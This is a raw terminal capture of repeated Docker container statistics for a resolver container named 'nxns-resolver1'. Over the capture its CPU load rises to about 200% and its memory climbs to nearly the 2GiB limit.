[J[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O         PIDS
bc4d1f763d1d   nxns-resolver1   0.00%     1008MiB / 2GiB      49.23%    17.7MB / 17.6MB   24.6kB / 8.19kB   243
[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O         PIDS [K
bc4d1f763d1d   nxns-resolver1   0.00%     1008MiB / 2GiB      49.23%    17.7MB / 17.6MB   24.6kB / 8.19kB   243 [K
 [K
[J[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O         PIDS
bc4d1f763d1d   nxns-resolver1   0.00%     1008MiB / 2GiB      49.23%    17.7MB / 17.6MB   24.6kB / 8.19kB   243
[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O         PIDS [K
bc4d1f763d1d   nxns-resolver1   0.00%     1008MiB / 2GiB      49.23%    17.7MB / 17.6MB   24.6kB / 8.19kB   243 [K
 [K
[J[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O         PIDS
bc4d1f763d1d   nxns-resolver1   0.00%     1008MiB / 2GiB      49.23%    17.7MB / 17.6MB   24.6kB / 8.19kB   243
[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O         PIDS [K
bc4d1f763d1d   nxns-resolver1   0.00%     1008MiB / 2GiB      49.23%    17.7MB / 17.6MB   24.6kB / 8.19kB   243 [K
 [K
[J[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O         PIDS
bc4d1f763d1d   nxns-resolver1   0.00%     1008MiB / 2GiB      49.23%    17.7MB / 17.6MB   24.6kB / 8.19kB   243
[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O         PIDS [K
bc4d1f763d1d   nxns-resolver1   0.00%     1008MiB / 2GiB      49.23%    17.7MB / 17.6MB   24.6kB / 8.19kB   243 [K
 [K
[J[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O         PIDS
bc4d1f763d1d   nxns-resolver1   0.00%     1008MiB / 2GiB      49.23%    17.7MB / 17.6MB   24.6kB / 8.19kB   243
[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O         PIDS [K
bc4d1f763d1d   nxns-resolver1   0.00%     1008MiB / 2GiB      49.23%    17.7MB / 17.6MB   24.6kB / 8.19kB   243 [K
 [K
[J[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O         PIDS
bc4d1f763d1d   nxns-resolver1   0.00%     1008MiB / 2GiB      49.23%    17.7MB / 17.6MB   24.6kB / 8.19kB   243
[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O         PIDS [K
bc4d1f763d1d   nxns-resolver1   0.00%     1008MiB / 2GiB      49.23%    17.7MB / 17.6MB   24.6kB / 8.19kB   243 [K
 [K
[J[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O         PIDS
bc4d1f763d1d   nxns-resolver1   0.00%     1008MiB / 2GiB      49.23%    17.7MB / 17.6MB   24.6kB / 8.19kB   243
[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O         PIDS [K
bc4d1f763d1d   nxns-resolver1   0.00%     1008MiB / 2GiB      49.23%    17.7MB / 17.6MB   24.6kB / 8.19kB   243 [K
 [K
[J[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O         PIDS
bc4d1f763d1d   nxns-resolver1   0.00%     1008MiB / 2GiB      49.23%    17.7MB / 17.6MB   24.6kB / 8.19kB   243
[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O         PIDS [K
bc4d1f763d1d   nxns-resolver1   0.00%     1008MiB / 2GiB      49.23%    17.7MB / 17.6MB   24.6kB / 8.19kB   243 [K
 [K
[J[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O         PIDS
bc4d1f763d1d   nxns-resolver1   0.00%     1008MiB / 2GiB      49.23%    17.7MB / 17.6MB   24.6kB / 8.19kB   243
[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O         PIDS [K
bc4d1f763d1d   nxns-resolver1   0.00%     1008MiB / 2GiB      49.23%    17.7MB / 17.6MB   24.6kB / 8.19kB   243 [K
 [K
[J[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O         PIDS
bc4d1f763d1d   nxns-resolver1   0.00%     1008MiB / 2GiB      49.23%    17.7MB / 17.6MB   24.6kB / 8.19kB   243
[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O         PIDS [K
bc4d1f763d1d   nxns-resolver1   0.00%     1008MiB / 2GiB      49.23%    17.7MB / 17.6MB   24.6kB / 8.19kB   243 [K
 [K
[J[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O         PIDS
bc4d1f763d1d   nxns-resolver1   0.00%     1008MiB / 2GiB      49.23%    17.7MB / 17.6MB   24.6kB / 8.19kB   243
[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O         PIDS [K
bc4d1f763d1d   nxns-resolver1   0.00%     1008MiB / 2GiB      49.23%    17.7MB / 17.6MB   24.6kB / 8.19kB   243 [K
 [K
[J[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O         PIDS
bc4d1f763d1d   nxns-resolver1   3.19%     1014MiB / 2GiB      49.53%    17.9MB / 17.7MB   24.6kB / 8.19kB   243
[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O         PIDS [K
bc4d1f763d1d   nxns-resolver1   3.19%     1014MiB / 2GiB      49.53%    17.9MB / 17.7MB   24.6kB / 8.19kB   243 [K
 [K
[J[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O         PIDS
bc4d1f763d1d   nxns-resolver1   3.19%     1014MiB / 2GiB      49.53%    17.9MB / 17.7MB   24.6kB / 8.19kB   243
[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O         PIDS [K
bc4d1f763d1d   nxns-resolver1   3.19%     1014MiB / 2GiB      49.53%    17.9MB / 17.7MB   24.6kB / 8.19kB   243 [K
 [K
[J[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O         PIDS
bc4d1f763d1d   nxns-resolver1   217.87%   1.376GiB / 2GiB     68.78%    21.4MB / 17.9MB   24.6kB / 8.19kB   243
[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O         PIDS [K
bc4d1f763d1d   nxns-resolver1   217.87%   1.376GiB / 2GiB     68.78%    21.4MB / 17.9MB   24.6kB / 8.19kB   243 [K
 [K
[J[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O         PIDS
bc4d1f763d1d   nxns-resolver1   217.87%   1.376GiB / 2GiB     68.78%    21.4MB / 17.9MB   24.6kB / 8.19kB   243
[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O         PIDS [K
bc4d1f763d1d   nxns-resolver1   217.87%   1.376GiB / 2GiB     68.78%    21.4MB / 17.9MB   24.6kB / 8.19kB   243 [K
 [K
[J[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O         PIDS
bc4d1f763d1d   nxns-resolver1   202.71%   1.486GiB / 2GiB     74.28%    22.5MB / 18.3MB   24.6kB / 8.19kB   243
[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O         PIDS [K
bc4d1f763d1d   nxns-resolver1   202.71%   1.486GiB / 2GiB     74.28%    22.5MB / 18.3MB   24.6kB / 8.19kB   243 [K
 [K
[J[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O         PIDS
bc4d1f763d1d   nxns-resolver1   202.71%   1.486GiB / 2GiB     74.28%    22.5MB / 18.3MB   24.6kB / 8.19kB   243
[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O         PIDS [K
bc4d1f763d1d   nxns-resolver1   202.71%   1.486GiB / 2GiB     74.28%    22.5MB / 18.3MB   24.6kB / 8.19kB   243 [K
 [K
[J[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O         PIDS
bc4d1f763d1d   nxns-resolver1   200.84%   1.538GiB / 2GiB     76.90%    22.7MB / 18.4MB   24.6kB / 8.19kB   243
[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O         PIDS [K
bc4d1f763d1d   nxns-resolver1   200.84%   1.538GiB / 2GiB     76.90%    22.7MB / 18.4MB   24.6kB / 8.19kB   243 [K
 [K
[J[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O         PIDS
bc4d1f763d1d   nxns-resolver1   200.84%   1.538GiB / 2GiB     76.90%    22.7MB / 18.4MB   24.6kB / 8.19kB   243
[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O         PIDS [K
bc4d1f763d1d   nxns-resolver1   200.84%   1.538GiB / 2GiB     76.90%    22.7MB / 18.4MB   24.6kB / 8.19kB   243 [K
 [K
[J[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O         PIDS
bc4d1f763d1d   nxns-resolver1   200.11%   1.576GiB / 2GiB     78.78%    22.9MB / 18.5MB   24.6kB / 8.19kB   243
[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O         PIDS [K
bc4d1f763d1d   nxns-resolver1   200.11%   1.576GiB / 2GiB     78.78%    22.9MB / 18.5MB   24.6kB / 8.19kB   243 [K
 [K
[J[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O         PIDS
bc4d1f763d1d   nxns-resolver1   200.11%   1.576GiB / 2GiB     78.78%    22.9MB / 18.5MB   24.6kB / 8.19kB   243
[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O         PIDS [K
bc4d1f763d1d   nxns-resolver1   200.11%   1.576GiB / 2GiB     78.78%    22.9MB / 18.5MB   24.6kB / 8.19kB   243 [K
 [K
[J[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O         BLOCK I/O         PIDS
bc4d1f763d1d   nxns-resolver1   201.71%   1.615GiB / 2GiB     80.76%    23MB / 18.7MB   24.6kB / 8.19kB   243
[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O         BLOCK I/O         PIDS [K
bc4d1f763d1d   nxns-resolver1   201.71%   1.615GiB / 2GiB     80.76%    23MB / 18.7MB   24.6kB / 8.19kB   243 [K
 [K
[J[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O         BLOCK I/O         PIDS
bc4d1f763d1d   nxns-resolver1   201.71%   1.615GiB / 2GiB     80.76%    23MB / 18.7MB   24.6kB / 8.19kB   243
[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O         BLOCK I/O         PIDS [K
bc4d1f763d1d   nxns-resolver1   201.71%   1.615GiB / 2GiB     80.76%    23MB / 18.7MB   24.6kB / 8.19kB   243 [K
 [K
[J[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O         PIDS
bc4d1f763d1d   nxns-resolver1   207.81%   1.646GiB / 2GiB     82.32%    23.2MB / 18.8MB   24.6kB / 8.19kB   243
[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O         PIDS [K
bc4d1f763d1d   nxns-resolver1   207.81%   1.646GiB / 2GiB     82.32%    23.2MB / 18.8MB   24.6kB / 8.19kB   243 [K
 [K
[J[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O         PIDS
bc4d1f763d1d   nxns-resolver1   207.81%   1.646GiB / 2GiB     82.32%    23.2MB / 18.8MB   24.6kB / 8.19kB   243
[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O         PIDS [K
bc4d1f763d1d   nxns-resolver1   207.81%   1.646GiB / 2GiB     82.32%    23.2MB / 18.8MB   24.6kB / 8.19kB   243 [K
 [K
[J[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O         PIDS
bc4d1f763d1d   nxns-resolver1   215.96%   1.685GiB / 2GiB     84.24%    23.4MB / 18.9MB   24.6kB / 8.19kB   243
[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O         PIDS [K
bc4d1f763d1d   nxns-resolver1   215.96%   1.685GiB / 2GiB     84.24%    23.4MB / 18.9MB   24.6kB / 8.19kB   243 [K
 [K
[J[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O         PIDS
bc4d1f763d1d   nxns-resolver1   215.96%   1.685GiB / 2GiB     84.24%    23.4MB / 18.9MB   24.6kB / 8.19kB   243
[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O         PIDS [K
bc4d1f763d1d   nxns-resolver1   215.96%   1.685GiB / 2GiB     84.24%    23.4MB / 18.9MB   24.6kB / 8.19kB   243 [K
 [K
[J[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O         BLOCK I/O         PIDS
bc4d1f763d1d   nxns-resolver1   198.83%   1.72GiB / 2GiB      86.02%    23.5MB / 19MB   24.6kB / 8.19kB   243
[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O         BLOCK I/O         PIDS [K
bc4d1f763d1d   nxns-resolver1   198.83%   1.72GiB / 2GiB      86.02%    23.5MB / 19MB   24.6kB / 8.19kB   243 [K
 [K
[J[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O         BLOCK I/O         PIDS
bc4d1f763d1d   nxns-resolver1   198.83%   1.72GiB / 2GiB      86.02%    23.5MB / 19MB   24.6kB / 8.19kB   243
[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O         BLOCK I/O         PIDS [K
bc4d1f763d1d   nxns-resolver1   198.83%   1.72GiB / 2GiB      86.02%    23.5MB / 19MB   24.6kB / 8.19kB   243 [K
 [K
[J[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O         PIDS
bc4d1f763d1d   nxns-resolver1   195.61%   1.758GiB / 2GiB     87.89%    23.7MB / 19.1MB   24.6kB / 8.19kB   243
[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O         PIDS [K
bc4d1f763d1d   nxns-resolver1   195.61%   1.758GiB / 2GiB     87.89%    23.7MB / 19.1MB   24.6kB / 8.19kB   243 [K
 [K
[J[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O         PIDS
bc4d1f763d1d   nxns-resolver1   195.61%   1.758GiB / 2GiB     87.89%    23.7MB / 19.1MB   24.6kB / 8.19kB   243
[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O         PIDS [K
bc4d1f763d1d   nxns-resolver1   195.61%   1.758GiB / 2GiB     87.89%    23.7MB / 19.1MB   24.6kB / 8.19kB   243 [K
 [K
[J[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O         PIDS
bc4d1f763d1d   nxns-resolver1   202.32%   1.797GiB / 2GiB     89.84%    23.8MB / 19.3MB   24.6kB / 8.19kB   243
[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O         PIDS [K
bc4d1f763d1d   nxns-resolver1   202.32%   1.797GiB / 2GiB     89.84%    23.8MB / 19.3MB   24.6kB / 8.19kB   243 [K
 [K
[J[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O         PIDS
bc4d1f763d1d   nxns-resolver1   202.32%   1.797GiB / 2GiB     89.84%    23.8MB / 19.3MB   24.6kB / 8.19kB   243
[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O         PIDS [K
bc4d1f763d1d   nxns-resolver1   202.32%   1.797GiB / 2GiB     89.84%    23.8MB / 19.3MB   24.6kB / 8.19kB   243 [K
 [K
[J[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O         PIDS
bc4d1f763d1d   nxns-resolver1   202.38%   1.836GiB / 2GiB     91.80%    23.9MB / 19.4MB   24.6kB / 8.19kB   243
[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O         PIDS [K
bc4d1f763d1d   nxns-resolver1   202.38%   1.836GiB / 2GiB     91.80%    23.9MB / 19.4MB   24.6kB / 8.19kB   243 [K
 [K
[J[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O         PIDS
bc4d1f763d1d   nxns-resolver1   202.38%   1.836GiB / 2GiB     91.80%    23.9MB / 19.4MB   24.6kB / 8.19kB   243
[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O         PIDS [K
bc4d1f763d1d   nxns-resolver1   202.38%   1.836GiB / 2GiB     91.80%    23.9MB / 19.4MB   24.6kB / 8.19kB   243 [K
 [K
[J[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O         PIDS
bc4d1f763d1d   nxns-resolver1   200.03%   1.878GiB / 2GiB     93.91%    24.1MB / 19.5MB   24.6kB / 8.19kB   243
[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O         PIDS [K
bc4d1f763d1d   nxns-resolver1   200.03%   1.878GiB / 2GiB     93.91%    24.1MB / 19.5MB   24.6kB / 8.19kB   243 [K
 [K
[J[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O         PIDS
bc4d1f763d1d   nxns-resolver1   200.03%   1.878GiB / 2GiB     93.91%    24.1MB / 19.5MB   24.6kB / 8.19kB   243
[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O         PIDS [K
bc4d1f763d1d   nxns-resolver1   200.03%   1.878GiB / 2GiB     93.91%    24.1MB / 19.5MB   24.6kB / 8.19kB   243 [K
 [K
[J[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O         PIDS
bc4d1f763d1d   nxns-resolver1   200.03%   1.878GiB / 2GiB     93.91%    24.1MB / 19.5MB   24.6kB / 8.19kB   243
[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O         PIDS [K
bc4d1f763d1d   nxns-resolver1   200.03%   1.878GiB / 2GiB     93.91%    24.1MB / 19.5MB   24.6kB / 8.19kB   243 [K
 [K
[J[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O         PIDS
bc4d1f763d1d   nxns-resolver1   200.57%   1.919GiB / 2GiB     95.95%    24.2MB / 19.6MB   24.6kB / 8.19kB   243
[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O         PIDS [K
bc4d1f763d1d   nxns-resolver1   200.57%   1.919GiB / 2GiB     95.95%    24.2MB / 19.6MB   24.6kB / 8.19kB   243 [K
 [K
[J[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O         PIDS
bc4d1f763d1d   nxns-resolver1   200.57%   1.919GiB / 2GiB     95.95%    24.2MB / 19.6MB   24.6kB / 8.19kB   243
[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O         PIDS [K
bc4d1f763d1d   nxns-resolver1   200.57%   1.919GiB / 2GiB     95.95%    24.2MB / 19.6MB   24.6kB / 8.19kB   243 [K
 [K
[J[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O         PIDS
bc4d1f763d1d   nxns-resolver1   210.98%   1.96GiB / 2GiB      97.99%    24.4MB / 19.7MB   24.6kB / 8.19kB   243
[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O         PIDS [K
bc4d1f763d1d   nxns-resolver1   210.98%   1.96GiB / 2GiB      97.99%    24.4MB / 19.7MB   24.6kB / 8.19kB   243 [K
 [K
[J[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O         PIDS
bc4d1f763d1d   nxns-resolver1   210.98%   1.96GiB / 2GiB      97.99%    24.4MB / 19.7MB   24.6kB / 8.19kB   243
[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O         PIDS [K
bc4d1f763d1d   nxns-resolver1   210.98%   1.96GiB / 2GiB      97.99%    24.4MB / 19.7MB   24.6kB / 8.19kB   243 [K
 [K
[J[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O         PIDS
bc4d1f763d1d   nxns-resolver1   188.73%   1.995GiB / 2GiB     99.75%    24.5MB / 19.8MB   24.6kB / 8.19kB   243
[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O         PIDS [K
bc4d1f763d1d   nxns-resolver1   188.73%   1.995GiB / 2GiB     99.75%    24.5MB / 19.8MB   24.6kB / 8.19kB   243 [K
 [K
[J[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O         PIDS
bc4d1f763d1d   nxns-resolver1   188.73%   1.995GiB / 2GiB     99.75%    24.5MB / 19.8MB   24.6kB / 8.19kB   243
[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O         PIDS [K
bc4d1f763d1d   nxns-resolver1   188.73%   1.995GiB / 2GiB     99.75%    24.5MB / 19.8MB   24.6kB / 8.19kB   243 [K
 [K
[J[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O         BLOCK I/O        PIDS
bc4d1f763d1d   nxns-resolver1   204.33%   1.998GiB / 2GiB     99.89%    24.7MB / 20MB   377kB / 8.19kB   243
[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O         BLOCK I/O        PIDS [K
bc4d1f763d1d   nxns-resolver1   204.33%   1.998GiB / 2GiB     99.89%    24.7MB / 20MB   377kB / 8.19kB   243 [K
 [K
[J[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O         BLOCK I/O        PIDS
bc4d1f763d1d   nxns-resolver1   204.33%   1.998GiB / 2GiB     99.89%    24.7MB / 20MB   377kB / 8.19kB   243
[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O         BLOCK I/O        PIDS [K
bc4d1f763d1d   nxns-resolver1   204.33%   1.998GiB / 2GiB     99.89%    24.7MB / 20MB   377kB / 8.19kB   243 [K
 [K
[J[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O        PIDS
bc4d1f763d1d   nxns-resolver1   193.47%   1.997GiB / 2GiB     99.86%    24.9MB / 20.2MB   385kB / 8.19kB   243
[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O        PIDS [K
bc4d1f763d1d   nxns-resolver1   193.47%   1.997GiB / 2GiB     99.86%    24.9MB / 20.2MB   385kB / 8.19kB   243 [K
 [K
[J[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O        PIDS
bc4d1f763d1d   nxns-resolver1   193.47%   1.997GiB / 2GiB     99.86%    24.9MB / 20.2MB   385kB / 8.19kB   243
[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O        PIDS [K
bc4d1f763d1d   nxns-resolver1   193.47%   1.997GiB / 2GiB     99.86%    24.9MB / 20.2MB   385kB / 8.19kB   243 [K
 [K
[J[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O        PIDS
bc4d1f763d1d   nxns-resolver1   204.73%   1.998GiB / 2GiB     99.88%    25.1MB / 20.4MB   426kB / 8.19kB   243
[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O        PIDS [K
bc4d1f763d1d   nxns-resolver1   204.73%   1.998GiB / 2GiB     99.88%    25.1MB / 20.4MB   426kB / 8.19kB   243 [K
 [K
[J[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O        PIDS
bc4d1f763d1d   nxns-resolver1   204.73%   1.998GiB / 2GiB     99.88%    25.1MB / 20.4MB   426kB / 8.19kB   243
[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O        PIDS [K
bc4d1f763d1d   nxns-resolver1   204.73%   1.998GiB / 2GiB     99.88%    25.1MB / 20.4MB   426kB / 8.19kB   243 [K
 [K
[J[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O        PIDS
bc4d1f763d1d   nxns-resolver1   206.20%   1.998GiB / 2GiB     99.89%    25.3MB / 20.5MB   430kB / 8.19kB   243
[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O        PIDS [K
bc4d1f763d1d   nxns-resolver1   206.20%   1.998GiB / 2GiB     99.89%    25.3MB / 20.5MB   430kB / 8.19kB   243 [K
 [K
[J[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O        PIDS
bc4d1f763d1d   nxns-resolver1   206.20%   1.998GiB / 2GiB     99.89%    25.3MB / 20.5MB   430kB / 8.19kB   243
[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O        PIDS [K
bc4d1f763d1d   nxns-resolver1   206.20%   1.998GiB / 2GiB     99.89%    25.3MB / 20.5MB   430kB / 8.19kB   243 [K
 [K
[J[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O        PIDS
bc4d1f763d1d   nxns-resolver1   197.24%   1.998GiB / 2GiB     99.90%    25.4MB / 20.6MB   651kB / 8.19kB   243
[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O        PIDS [K
bc4d1f763d1d   nxns-resolver1   197.24%   1.998GiB / 2GiB     99.90%    25.4MB / 20.6MB   651kB / 8.19kB   243 [K
 [K
[J[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O        PIDS
bc4d1f763d1d   nxns-resolver1   197.24%   1.998GiB / 2GiB     99.90%    25.4MB / 20.6MB   651kB / 8.19kB   243
[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O        PIDS [K
bc4d1f763d1d   nxns-resolver1   197.24%   1.998GiB / 2GiB     99.90%    25.4MB / 20.6MB   651kB / 8.19kB   243 [K
 [K
[J[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O        PIDS
bc4d1f763d1d   nxns-resolver1   206.14%   1.997GiB / 2GiB     99.87%    25.6MB / 20.8MB   979kB / 8.19kB   243
[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O        PIDS [K
bc4d1f763d1d   nxns-resolver1   206.14%   1.997GiB / 2GiB     99.87%    25.6MB / 20.8MB   979kB / 8.19kB   243 [K
 [K
[J[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O        PIDS
bc4d1f763d1d   nxns-resolver1   206.14%   1.997GiB / 2GiB     99.87%    25.6MB / 20.8MB   979kB / 8.19kB   243
